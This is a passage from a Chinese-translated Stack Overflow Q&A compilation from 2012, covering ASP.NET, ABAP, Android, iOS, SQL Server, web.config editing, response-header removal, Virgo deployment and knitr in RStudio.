var jsvariable = "<%=TestVariable%>" 
```

不工作。似乎只有 WebResource(...) 有效。当我尝试使用变量时，当我做这样的事情时：

```
alert("<%=TestVariable%>"); 
```

将出现带有字符串“<%=TestVariable%>”的窗口，而不是“It works”

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T14:42:12.303

也许我没有正确理解您的问题，但是您有一个引用外部 JavaScript 文件的服务器控件，但在外部文件中您想使用控件上的属性。

如果那是您要问的，那么恐怕如果不编写自定义处理程序或类似的东西，这是不可能的。您会看到，客户端请求的外部 JavaScript 文件与您的控件执行是分开的。在服务器提供 JavaScript 文件时，控件早已被销毁。

这是发生的事情：

1.  请求到达您的服务器以获取该页面
2.  该页面加载并创建您的用户控件和指向外部 javascript 文件的链接
3.  客户端从服务器获取结果
4.  客户端看到外部 javascript 文件的链接并从服务器请求它
5.  对 javascript 文件的请求进入服务器
6.  服务器向客户端提供 javascript 文件

如您所见，有两个请求进入（步骤 1 和步骤 5）。在第二个请求中，即针对 javascript 文件的请求中，您不再拥有具有可用属性的控件（在步骤 1 中）。

我能想到的唯一方法是使用自定义处理程序来提供 javascript。这样，您可以将任何变量作为查询字符串值传递，并让自定义处理程序将它们插入到您的 java 脚本中。

我希望这回答了你的问题。

# loops - 一些发票在输出列表中重复出现

> ID：11155148
> 
> 赞同：0
> 
> 时间：2012-06-22T11:16:34.447
> 
> 标签：loops, abap, sap-erp

我一直在做报告，现在它在质量服务器中。问题是，它在开发时运行良好，但现在它重复了一些发票编号，而不是全部，并且一张发票重复两次，另一张重复四次。不知道是代码问题还是别的什么。这是代码：

```
IF kunnr[] IS INITIAL
    AND belnr[] IS INITIAL
    AND spart IS NOT INITIAL
    AND gjahr[] IS NOT INITIAL
    AND bukrs[] IS NOT INITIAL
    AND allgstid IS INITIAL
    AND augdt[] IS NOT INITIAL
    AND budat[] IS INITIAL
    AND kbetr IS INITIAL
    AND vkorg IS INITIAL.
    SELECT c~kunnr a~belnr d~spart a~bldat a~waers c~wrbtr a~hwaer c~dmbtr
      INTO CORRESPONDING FIELDS OF TABLE lt_data
        FROM ( ( bkpf AS a
      INNER JOIN bsad AS c ON c~belnr = a~belnr )
      INNER JOIN vbrk AS d ON d~xblnr = c~belnr )
      WHERE a~gjahr IN gjahr
        AND a~bukrs IN bukrs
        AND d~spart = spart
        AND c~augdt IN augdt.
    IF sy-subrc <> 0.
      MESSAGE i425.
    ENDIF.

  ENDIF.

  LOOP AT lt_data ASSIGNING <fs_main>.

    CLEAR <fs_main>-kbetr.
    CLEAR <fs_main>-fwste.
    CLEAR <fs_main>-hwste.
    IF kbetr IS INITIAL.
      SELECT SINGLE kbetr fwste hwste
        FROM bset
        INTO (<fs_main>-kbetr, <fs_main>-fwste, <fs_main>-hwste)
        WHERE belnr = <fs_main>-belnr
        AND bukrs IN bukrs
        AND gjahr IN gjahr
        AND mwskz BETWEEN 'L0' AND 'L2'.
    ELSE.
      SELECT SINGLE kbetr fwste hwste
        FROM bset
        INTO (<fs_main>-kbetr, <fs_main>-fwste, <fs_main>-hwste)
        WHERE belnr = <fs_main>-belnr
        AND bukrs IN bukrs
        AND gjahr IN gjahr
        AND mwskz BETWEEN 'L0' AND 'L2'
        AND kbetr = kbetr.
    ENDIF.

    AT NEW kunnr.

      SELECT SINGLE name1 FROM kna1
          INTO (wa_bseg-name1)
          WHERE kunnr = <fs_main>-kunnr.

      IF sy-subrc = 0.
        FORMAT COLOR COL_TOTAL INTENSIFIED ON.

        WRITE:/ sy-uline(137), / sy-vline NO-GAP,
                        2 'Entidade: ', <fs_main>-kunnr, wa_bseg-name1,
                        137 sy-vline NO-GAP, / sy-uline(137).

      ENDIF.
    ENDAT.

    FORMAT COLOR COL_NORMAL INTENSIFIED OFF.
    WRITE:/
            sy-vline NO-GAP,
            (16) <fs_main>-belnr NO-GAP,
            sy-vline NO-GAP,
            (16) <fs_main>-spart CENTERED NO-GAP,
            sy-vline NO-GAP,
            (10) <fs_main>-bldat NO-GAP,
            sy-vline NO-GAP.
    perc = <fs_main>-kbetr / 10.
    WRITE: (10) perc NO-GAP,
            sy-vline NO-GAP,
            (5) <fs_main>-waers NO-GAP,
            sy-vline NO-GAP,
            (16) <fs_main>-wrbtr NO-GAP,
            sy-vline NO-GAP,
            (16) <fs_main>-fwste NO-GAP,
            sy-vline NO-GAP,
            (5) <fs_main>-hwaer NO-GAP,
            sy-vline NO-GAP,
            (16) <fs_main>-dmbtr NO-GAP,
            sy-vline NO-GAP,
            (16) <fs_main>-hwste NO-GAP,
            sy-vline NO-GAP.
    WRITE:/ sy-uline(137). 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:58:00.110

您正在做`INNER JOIN bsad`，但表 bsad 有一个主键，其中包括 BUZEI，即会计凭证中行项目的编号。因此，如果发票有多个行项目，您将获得多个行...如果您只想要每个文档一行，则不要加入 bsad。如果您需要来自 bsad 的信息，您可以将其拉入循环中的单独选择中（例如，您可以为每个文档选择 wrbtr 的总和，我认为）。

实际上我之前遇到过这种类型的事情，因为在开发中不可避免地我创建的所有测试文档都只有一个行项目（因为它更快..）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-02T10:12:04.837

问题已经解决了。我使用了错误的 vbrk 表字段。它应该是 vbeln，而不是 xblnr。还是非常感谢。

# java - Android - 在启动屏幕上禁用声音

> ID：11155151
> 
> 赞同：0
> 
> 时间：2012-06-22T11:16:42.113
> 
> 标签：java, android, audio, soundpool

我的应用程序有一个启动画面，它在启动时播放 mp3 剪辑。

我想通过我的应用程序的设置菜单为用户提供禁用/启用声音的选项。我该如何实现这一点，以便应用程序在每次打开应用程序时记住用户的偏好。

请参阅下面的代码以获取声音。

```
public class Splash extends SherlockActivity {

SoundPool sp;
int explosion = 0;
MediaPlayer mp;

protected void onCreate(Bundle savedInstanceState) {
    // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);

    getSupportActionBar().hide();

    setContentView(R.layout.splash);

    sp = new SoundPool(5, AudioManager.STREAM_MUSIC, 0);
    explosion = sp.load(this, R.raw.soundfile, 1);

    Thread timer = new Thread() {
        public void run() {
            try {
                sleep(5000);

                if (explosion != 0)
                    sp.play(explosion, 1, 1, 0, 0, 1);

            } catch (InterruptedException e) {
                e.printStackTrace();
            } finally {
                Intent openMenu = new Intent(
                        "ttj.android.t3w.STARTINGPOINT");
                startActivity(openMenu);
            }

        }
    };
    timer.start();

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T11:17:47.130

使用 SharedPreferences 存储和检索它：http: [//developer.android.com/reference/android/content/SharedPreferences.html](http://developer.android.com/reference/android/content/SharedPreferences.html)

示例：http: [//developer.android.com/guide/topics/data/data-storage.html#pref](http://developer.android.com/guide/topics/data/data-storage.html#pref)

```
public static final String PREFS_NAME = "MyPrefsFile";

//retrieve
SharedPreferences settings = getSharedPreferences(PREFS_NAME, 0);
boolean silent = settings.getBoolean("silentMode", false);
//use silent

//store
SharedPreferences settings = getSharedPreferences(PREFS_NAME, 0);
SharedPreferences.Editor editor = settings.edit();
editor.putBoolean("silentMode", mSilentMode);
editor.commit(); 
```

# iphone - 获取错误的 ipad 可用内存？

> ID：11155155
> 
> 赞同：0
> 
> 时间：2012-06-22T11:17:03.653
> 
> 标签：iphone, xcode, memory

我从以下方法获取可用内存：

```
static void print_free_memory () {
float totalSpace = 0.0f;  
NSError *error = nil;  

NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);  

NSDictionary *dictionary = [[NSFileManager defaultManager] attributesOfFileSystemForPath:[paths lastObject] error: &error];  

if (dictionary) {  
    NSNumber *fileSystemSizeInBytes = [dictionary objectForKey: NSFileSystemSize];  
    totalSpace = [fileSystemSizeInBytes floatValue];  
    NSLog(@"Total memory:%f",totalSpace);
    freeMemAvailable = [[dictionary objectForKey:NSFileSystemFreeSize] floatValue];
    NSLog(@"Free Memory:%f",freeMemAvailable);
} else {  
    NSLog(@"Error Obtaining File System Info: Domain = %@, Code = %@", [error domain], [error code]);  
}
} 
```

上述方法返回 = 9139.650391 mb ~ 9.14 GB 并且设备上显示的设备内存 = 8.4 GB

大约有 700 MB 的差异。为什么会这样？有什么建议么。

我在device上查看设备内存的路径如下。转到：-设置->常规->关于->可用

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T11:24:00.493

您的计算不精确，函数返回字节大小，因此假设返回值是`9139650391`您需要将其除以 bu `(1024*1024*1024)`=`1073741824`

所以`9139650391/1073741824`大约等于 8.5 GB 而不是 9.14 GB

关于100MB的差异，还是有差异的，但没有700MB那么大

# c# - 是否可以读取 web.configuration 文件并在另一个 web.config 文件中添加一些标签？

> ID：11155156
> 
> 赞同：0
> 
> 时间：2012-06-22T11:17:09.413
> 
> 标签：c#, .net

让我们考虑一个从网站部署的 web.config 文件......

让我们拿另一个项目说控制台应用程序或某个类文件，那么是否可以读取该 web.configuration 文件并在该 web.config 文件中添加一些标签

我只想在其中添加这些行

 `````
<system.webServer>
    <modules>
      <add name="sample" type="sample.class" />
    </modules>
  </system.webServer> 
````  `等待您的宝贵意见

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T11:22:06.983

**更新：**阅读本文[并](http://www.codeproject.com/Articles/20016/Reading-and-Writing-app-config-or-web-config-Setti)下载源代码，它可以帮助您读取/写入配置文件中的新部分。

`AppSettings`要从文件中读取，`Web.Config`您可以使用 ConfigurationSettings 或 ConfigurationManager 类。

它的工作原理如下

```
string connectionInfo = ConfigurationSettings.AppSettings["ConnectionInfo"]; 
```

ConnectionInfo 位于 AppSettings 下的 Web.config 文件中，例如

```
<appSettings>
<add key="ConnectionInfo" value="server=(local);database=Northwind;Integrated Security=SSPI" />
</appSettings> 
```

并写在 web.config AppSettings 部分..假设您在配置文件的 appsettings 部分中有一个键“SiteName”...您可以像这样更新它..

```
Configuration config = WebConfigurationManager.OpenWebConfiguration("~");  
config.AppSettings.Settings["SiteName"].Value = "New Site Name Value";  
config.Save(ConfigurationSaveMode.Modified);  
ConfigurationManager.RefreshSection("appSettings"); 
`````

# java - Gps lat & long 随机显示非常不准确的结果

> ID：11155160
> 
> 赞同：0
> 
> 时间：2012-06-22T11:17:14.060
> 
> 标签：java, android, gps

我正在听我的手机 GPS 并将纬度和经度发布到我的网络服务中，每次`onLocationChanged`都会被调用。我的问题是，在我大约 2% 的帖子中，它显示的结果非常不准确（相距几英里）。我应该在发布之前检查我的`location`对象的准确性吗？或者你有什么其他建议吗？谢谢！

```
public void onLocationChanged(Location location) {
    locationManager.removeUpdates(networkLocationListener);

    textView.setText(textView.getText().toString() + "New GPS location: "
            + String.format("%9.6f", location.getLatitude()) + ", "
            + String.format("%9.6f", location.getLongitude()) + "\n");

    //float accuracy = location.getAccuracy(); check this value?

    postLocationToWebservice(location);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T14:57:22.127

这是使用 Android 的位置服务时非常常见的问题。您可以引入很少的检查来确保只有准确的位置会发布到您的网络服务。

1.比较所有位置服务的准确性。

2.定义准确度的最小限制和时间的最大限制。（因为有时获得的位置是准确的，但它是一个旧的）。

检查此代码片段并进行必要的更改以完成您想要的。确保您进行日志构建以检查算法的准确性。

```
List<String> matchingProviders = myLocation.lm.getAllProviders();
    for (String provider: matchingProviders) 
    {
        Location location = myLocation.lm.getLastKnownLocation(provider);
        if (location != null) {
            float accuracy = location.getAccuracy();
            long time = location.getTime();

            if ((time > minTime && accuracy < bestAccuracy)) {
                bestResult = location;
                bestAccuracy = accuracy;
                bestTime = time;
            }
            else if (time < minTime && bestAccuracy == Float.MAX_VALUE && time > bestTime) {
                bestResult = location;
                bestTime = time;
            }
        }
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T11:30:54.593

更新的位置可能是由`NETWORK_PROVIDER`而不是`GPS_PROVIDER`

您始终可以通过以下方式获取最后更新的 GPS 位置

```
 mLocationMgr.getLastKnownLocation(LocationManager.GPS_PROVIDER); 
```

# html - 如何在行之间制作分隔符

> ID：11155169
> 
> 赞同：-2
> 
> 时间：2012-06-22T11:17:40.973
> 
> 标签：html, css

我正在尝试制作一张桌子，我需要像[这个站点](http://translate.uservoice.com/sets/35-end-user-ar/translations?filter=missing)一样有分隔线，即行之间的分隔线必须是细长的灰色。我正在尝试这段代码，但它不起作用：

```
<table rules="rows">
    <tbody>
        <?php
            foreach ($records as $record) {
                if (isset($record['translate'])) 
                {
                    echo '<tr>';
                    echo "<td width='500'>" . strip_tags($record['language_value']) . "</td>";
                    echo "<td width='200'>" . strip_tags($record['translate']) . "</td>";
                    echo '</tr>';
                }
            }
        ?>
    </tbody>
</table> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T12:15:20.603

我认为这就是你要找的：

```
<table>
    <tr style="border-bottom: 1px dotted silver;">
        <td style="width:500px">foo</td>
        <td style="width:200px">bar</td>
    </tr>
    <tr style="border-bottom: 1px dotted silver;">
        <td style="width:500px">foo</td>
        <td style="width:200px">bar</td>
    </tr>
    <tr style="border-bottom: 1px dotted silver;">
        <td style="width:500px">foo</td>
        <td style="width:200px">bar</td>
    </tr>
</table> 
```

这是内联 CSS。如果您需要 CSS 类解决方案，请告诉我。

# sql - SQL Server - 在查询中选择一列（int val）和5次列

> ID：11155172
> 
> 赞同：0
> 
> 时间：2012-06-22T11:17:47.537
> 
> 标签：sql, sql-server

我想在 SQL Server 中做这样的事情：

```
SELECT
    pt.quantity AS 'QTY'
    ,[QTY] * 5
 FROM
 product pt 
```

但在这里我收到错误：
列名“数量”无效。

请提出可能是什么问题或可能的解决方法。

谢谢，
贾斯汀塞缪尔。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T11:19:13.677

它此时不知道如何解析名称“QTY”（例如，如果它是子查询）。尝试：

```
SELECT
    pt.quantity AS 'QTY'
    ,pt.quantity * 5
 FROM
 product pt 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T11:19:22.570

只需这样做：

```
SELECT
    pt.quantity AS QTY,
    pt.quantity * 5 as QTY_BY_5
FROM product pt 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-22T11:20:07.333

试试这个：

```
SELECT
    pt.quantity AS 'QTY'
    ,pt.quantity * 5 AS 'QTY1'
 FROM
 product pt 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-22T11:21:41.810

您不能使用列的别名进行计算。
因此，只需将**'QTy'**替换为**pt.quantity**，它就会起作用。

```
SELECT
    pt.quantity AS 'QTY'
    ,pt.quantity * 5
 FROM
 product pt 
```

它会为你工作。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-06-22T11:25:52.573

我认为这也可以

```
SELECT
    quantity AS 'QTY'
    ,quantity  * 5
 FROM
 product 
```

你也可以试试这个

```
SELECT QTY,QTY * 5 FROM 
(
 SELECT
        quantity AS 'QTY'   
     FROM
     product) Productstable 
```

# asp.net-web-api - 从响应中删除标头

> ID：11155176
> 
> 赞同：13
> 
> 时间：2012-06-22T11:18:06.227
> 
> 标签：asp.net-web-api, wcf-web-api

我需要隐藏由 ASP.NET 和 IIS 生成并在 ASP.NET WebAPI 服务的响应中返回的某些标头。我需要隐藏的标题是：

*   服务器
*   X-AspNet-版本
*   X-AspNetMvc-版本
*   X-Powered-By

该服务之前托管在 WCF 中，并且通过订阅 PreSendRequestHeaders 并操作 HttpContext.Current.Response.Headers 在 HttpModule 中完成伪装。使用 ASP.NET WebAPI，一切现在都是基于任务的，因此 HttpContext.Current 为空。我试图插入一个消息处理程序并操作返回的 HttpResponseMessage，但该阶段上不存在标头。X-Powered-By 可以在 IIS 设置中删除，但是建议的删除其余部分的方法是什么？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-22T12:16:34.887

问题是每个都在不同的点添加：

*   `Server`: 由 IIS 添加。尽管您似乎已经使用 HttpModule 将其删除，但不确定是否可以将其关闭。
*   `X-AspNet-Version`：由 System.Web.dll 在`HttpResponse`课堂上 Flush 时添加
*   `X-AspNetMvc-Version`:`MvcHandler`在 System.Web.dll 中添加。它可以被覆盖，所以这个应该没问题。
*   `X-Powered-By`由 IIS 但可以按您所说的那样关闭。

我认为你最好的选择仍然是使用 HttpModules。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-08-26T08:54:36.250

为了那些通过 google/bing 搜索登陆这里的人的利益:: 以下是步骤摘要：

**第 1 步：**创建一个派生自 IHttpModule 的类（以及 IDisposable 以在我们完成后清理）：

```
 public class MyCustomModule : IHttpModule, IDisposable
    {
         private HttpApplication _httpApplication
private static readonly List<string> HeadersToCloak = new List<string>
            {
                "Server",
                "X-AspNet-Version",
                "X-AspNetMvc-Version",
                "X-Powered-By"
            };
    ..
    } 
```

**第 2 步：**在 IHttpModule.Init 方法中获取对内部上下文的引用，并将事件处理程序分配给 PreSendRequestHeaders 事件：

```
public void Init(HttpApplication context)
        {
            _httpApplication = context;

            context.PreSendRequestHeaders += OnPreSendRequestHeaders;
        } 
```

**第 3 步：**现在可以像这样删除标题：

```
private void OnPreSendRequestHeaders(object sender, EventArgs e)
        {
            if (null == _httpApplication)
            {
                return;
            }

            if (_httpApplication.Context != null)
            {
                var response = _httpApplication.Response;
                HeadersToCloak.ForEach(header => response.Headers.Remove(header));
            }
        } 
```

**第 4 步：**现在在 system.webserver 下的根 web.config 中注册此模块（如果运行 IIS 7.0 集成模式，请在此处查看更多详细信息）：

```
<configuration>
  <system.webServer>
    <modules>
      <add name="MyCustomModule" type="<namespace>.MyCustomModule "/>
    </modules>
  </system.webServer>
</configuration> 
```

希望这可以帮助！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-09T16:12:58.103

如果您使用的是 IIS7 / Azure，请查看以下内容：

[在没有 UrlScan 的情况下删除/隐藏/禁用 Azure/IIS7 中过多的 HTTP 响应标头](https://stackoverflow.com/questions/12803972/removing-hiding-disabling-excessive-http-response-headers-in-azure-iis7-without)

它展示了在不使用 HttpModules 的情况下禁用这些标头的最佳方法。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-04-02T19:13:36.360

如果您想删除版本，请转到 web.config 文件并添加这些行

```
<system.web>
<compilation debug="true" targetFramework="4.5.2" />
<!--enableVersionHeader remove the header-->
<httpRuntime targetFramework="4.5.2" enableVersionHeader = "false"/> 
```

另外，添加这些

```
<httpProtocol>
  <customHeaders>
    <!--enableVersionHeader remove the header-->
    <remove name ="X-Powered-By"/>
    </customHeaders>
</httpProtocol> 
```

# sql-server - Sql Server 插入命令将“Â”添加到 NVarChar 列

> ID：11155177
> 
> 赞同：1
> 
> 时间：2012-06-22T11:18:16.040
> 
> 标签：sql-server

我有一个sql命令如下：

```
INSERT [dbo].[Currency] ([CurrencyID], [Description], [Symbol]) 
VALUES (N'7418fe34-1abc-4189-b5f1-e638a34af1a1', N'GBP', N'£') 
```

当我对数据库运行它时，它将最后一列输入为'Â£'而不是'£'。我以前遇到过这个问题，但我一生都不记得如何解决它！

有任何想法吗？

谢谢。

## 更新

有趣的是，如果我将该行从我的 sql 文件复制并粘贴到 sql man stud 中，那么它就可以很好地插入。所以我认为我的 sql 文件有问题，其中可能有一个我看不到的字符？

## 更新

sql脚本有以下插入欧元符号：

```
INSERT [dbo].[Currency] ([CurrencyID], [Description], [Symbol])
VALUES (N'c60b1e0c-289a-4a0a-8c7d-30a490cbb7a8', N'EUR', N'€') 
```

并在最后一列的数据库中输出“â¬”

## 更新

好的，我现在已经将完整的 sql 文件复制并粘贴到 Sql Server 中并运行它，它现在插入一切正常。那么为什么只有在我运行“.sql”文件时才会出现这个问题呢？

## 更新

另一个更新！如果我在 Visual Studio 中查看“.sql”文件，它看起来很好，但是如果我在记事本中打开它，就会出现假字符！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-22T13:01:37.500

（来自评论）

该文件保存为 UTF-8，但 sqlcmd 使用错误的代码页读取它。添加`-f 65001`到选项告诉 sqlcmd 将其作为 UTF-8 文件读取。

# java - 将 WAR 部署到 virgo-tomcat 服务器

> ID：11155179
> 
> 赞同：2
> 
> 时间：2012-06-22T11:18:29.050
> 
> 标签：java, war, eclipse-virgo, deploying

在过去的几天里，我一直坚持将标准 WAR 部署到 Virgo-tomcat 服务器（版本 3.0.2）。从 eclipse 导出的标准 WAR 文件在 tomcat 上工作得很好，但在部署到 Virgo-tomcat 时就不行了。我已经阅读了用户指南和程序员指南，据我所知 - 这应该是将 WAR 部署到 VIRGO_HOME/pickup 目录（或者使用应用程序管理器）的情况。我已经尝试了这两种方法，但没有任何效果。

以下是日志的结果。

```
[2012-06-22 12:00:43.545] ERROR start-signalling-1           o.a.c.c.C.[Catalina].[localhost].[/spring-social-statusnet-tssg]  Error configuring application listener of class org.springframework.web.context.ContextLoaderListener java.lang.ClassNotFoundException: org.springframework.web.context.ContextLoaderListener
at org.eclipse.gemini.web.tomcat.internal.loading.BundleWebappClassLoader.loadClass(BundleWebappClassLoader.java:306)
at java.lang.ClassLoader.loadClass(ClassLoader.java:356)
at org.apache.catalina.core.DefaultInstanceManager.loadClass(DefaultInstanceManager.java:525)
at org.apache.catalina.core.DefaultInstanceManager.loadClassMaybePrivileged(DefaultInstanceManager.java:507)
at org.apache.catalina.core.DefaultInstanceManager.newInstance(DefaultInstanceManager.java:124)
at org.apache.catalina.core.StandardContext.listenerStart(StandardContext.java:4715)
at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5273)
at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:895)
at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:871)
at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:615)
at org.eclipse.gemini.web.tomcat.internal.TomcatServletContainer.startWebApplication(TomcatServletContainer.java:122)
at org.eclipse.gemini.web.internal.StandardWebApplication.start(StandardWebApplication.java:91)
at org.eclipse.virgo.web.core.internal.WebBundleLifecycleListener.onStarted(WebBundleLifecycleListener.java:122)
at org.eclipse.virgo.kernel.install.artifact.internal.StandardArtifactStateMonitor.onStarted(StandardArtifactStateMonitor.java:247)
at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact.asyncStartSucceeded(AbstractInstallArtifact.java:294)
at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact.access$0(AbstractInstallArtifact.java:291)
at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact$StateMonitorSignal.signalSuccessfulCompletion(AbstractInstallArtifact.java:229)
at org.eclipse.virgo.kernel.core.internal.BundleStartTracker$1.run(BundleStartTracker.java:143)
at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
at java.lang.Thread.run(Thread.java:722)

[2012-06-22 12:00:43.546] ERROR start-signalling-1           o.a.c.c.C.[Catalina].[localhost].[/spring-social-statusnet-tssg]  Skipped installing application listeners due to previous error(s) 

[2012-06-22 12:00:43.547] ERROR start-signalling-1           org.apache.catalina.core.StandardContext                          Error listenerStart 
[2012-06-22 12:00:43.547] ERROR start-signalling-1           org.apache.catalina.core.StandardContext                          Context [/spring-social-statusnet-tssg] startup failed due to previous errors 
[2012-06-22 12:00:43.702] ERROR start-signalling-1           org.eclipse.gemini.web.internal.StandardWebApplication            Failed to start web application at bundleContext path '/spring-social-statusnet-tssg' org.eclipse.gemini.web.core.spi.ServletContainerException: Web application at '/spring-social-statusnet-tssg' failed to start. Check the logs for more details.
    at org.eclipse.gemini.web.tomcat.internal.TomcatServletContainer.startWebApplication(TomcatServletContainer.java:125)
    at org.eclipse.gemini.web.internal.StandardWebApplication.start(StandardWebApplication.java:91)
    at org.eclipse.virgo.web.core.internal.WebBundleLifecycleListener.onStarted(WebBundleLifecycleListener.java:122)
    at org.eclipse.virgo.kernel.install.artifact.internal.StandardArtifactStateMonitor.onStarted(StandardArtifactStateMonitor.java:247)
    at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact.asyncStartSucceeded(AbstractInstallArtifact.java:294)
    at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact.access$0(AbstractInstallArtifact.java:291)
    at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact$StateMonitorSignal.signalSuccessfulCompletion(AbstractInstallArtifact.java:229)
    at org.eclipse.virgo.kernel.core.internal.BundleStartTracker$1.run(BundleStartTracker.java:143)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
    at java.lang.Thread.run(Thread.java:722)

[2012-06-22 12:00:43.708] ERROR start-signalling-1           org.eclipse.virgo.medic.eventlog.default                         WE0005E Failed to start web bundle 'spring-social-statusnet-tssg' version '0.0.0': consult serviceability/logs/log.log for further details. 
[2012-06-22 12:00:43.709] INFO  start-signalling-1           o.e.v.k.i.artifact.internal.bundle.BundleThreadContextManager     Thread context class loader 'KernelBundleClassLoader: [bundle=spring-social-statusnet-tssg_0.0.0]' popped and set to 'BundleDelegatingClassLoader for [spring-osgi-extender (org.springframework.osgi.extender)]' 
[2012-06-22 12:00:43.709] INFO  start-signalling-1           o.e.v.k.i.artifact.internal.bundle.BundleThreadContextManager     Thread context class loader 'BundleDelegatingClassLoader for [spring-osgi-extender (org.springframework.osgi.extender)]' pushed and set to 'KernelBundleClassLoader: [bundle=spring-social-statusnet-tssg_0.0.0]' 
[2012-06-22 12:00:43.709] INFO  start-signalling-1           o.e.v.k.i.a.internal.AtomicInstallArtifactLifecycleListener       No atomic parent of bundle 'spring-social-statusnet-tssg' version '0.0.0' in scope 'null' to propagate start failed (stop) event to 
[2012-06-22 12:00:43.715] ERROR start-signalling-1           org.eclipse.virgo.medic.eventlog.default                         DE0006E Start failed for bundle 'spring-social-statusnet-tssg' version '0.0.0'. org.eclipse.virgo.kernel.deployer.core.DeploymentException: Web application failed to start
    at org.eclipse.virgo.web.core.internal.WebBundleLifecycleListener.onStarted(WebBundleLifecycleListener.java:132)
    at org.eclipse.virgo.kernel.install.artifact.internal.StandardArtifactStateMonitor.onStarted(StandardArtifactStateMonitor.java:247)
    at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact.asyncStartSucceeded(AbstractInstallArtifact.java:294)
    at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact.access$0(AbstractInstallArtifact.java:291)
    at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact$StateMonitorSignal.signalSuccessfulCompletion(AbstractInstallArtifact.java:229)
    at org.eclipse.virgo.kernel.core.internal.BundleStartTracker$1.run(BundleStartTracker.java:143)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
    at java.lang.Thread.run(Thread.java:722)
Caused by: org.eclipse.gemini.web.core.WebApplicationStartFailedException: org.eclipse.gemini.web.core.spi.ServletContainerException: Web application at '/spring-social-statusnet-tssg' failed to start. Check the logs for more details.
    at org.eclipse.gemini.web.internal.StandardWebApplication.start(StandardWebApplication.java:108)
    at org.eclipse.virgo.web.core.internal.WebBundleLifecycleListener.onStarted(WebBundleLifecycleListener.java:122)
    ... 8 common frames omitted
Caused by: org.eclipse.gemini.web.core.spi.ServletContainerException: Web application at '/spring-social-statusnet-tssg' failed to start. Check the logs for more details.
    at org.eclipse.gemini.web.tomcat.internal.TomcatServletContainer.startWebApplication(TomcatServletContainer.java:125)
    at org.eclipse.gemini.web.internal.StandardWebApplication.start(StandardWebApplication.java:91)
    ... 9 common frames omitted 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-25T10:48:08.747

好的，所以在测试了几个测试应用程序之后，我设法让一些示例 WAR 无需任何修改即可在 Virgo 上运行。

为了解决手头的问题，我将以下行添加到我的 Web 应用程序的 MANIFEST.MF 文件中。

```
Import-Package: org.springframework.web.context 
```

# r - 有没有办法使用 RStudio 直接从你的工作区中编织降价？

> ID：11155182
> 
> 赞同：27
> 
> 时间：2012-06-22T11:18:31.857
> 
> 标签：r, knitr, rstudio

我想知道我是否可以使用`knitr`降价来即时创建一个包含来自我当前工作区的对象的报告。重现性不是这里的问题。我也在这里阅读了这个非常好的[线程](https://stackoverflow.com/questions/8434371/run-sweave-or-knitr-with-objects-from-existing-r-session)。

但是我仍然收到一条错误消息，抱怨找不到特定的对象。

1）假设我打开一个新的降价文档并保存它。

2）在我的工作区中写一个引用某个`lm`对象的块。称呼`summary(mylmobject)`

3）编织它。

不幸的是，报告已生成，但无法显示回归输出，因为找不到对象。请注意，如果我只是将对象保存到 .Rdata 然后直接从降价文件加载它，它通常可以工作。

有没有办法使用当前工作区中的 R markdown 中的对象？这将是非常好的向非 R 人展示一些输出，同时仍然工作。

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2012-06-22T15:04:24.430

RStudio 会为您的 R Markdown 文件打开一个*新*的R 会话`knit()`，因此您当前工作空间中的对象将无法用于该会话（它们是两个单独的会话）。两种解决方案：

1.  向 RStudio提交[功能请求](http://support.rstudio.org/help/discussions/problems)，要求他们在当前 R 会话中支持编织，而不是强制启动新会话；
2.  自己手动编织：（`library(knitr); knit('your_file.Rmd')`或者`knit2html()`如果您想一步完成 HTML 输出，或者`rmarkdown::render()`如果您使用的是[R Markdown v2](http://rmarkdown.rstudio.com)）

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2012-10-31T23:08:57.923

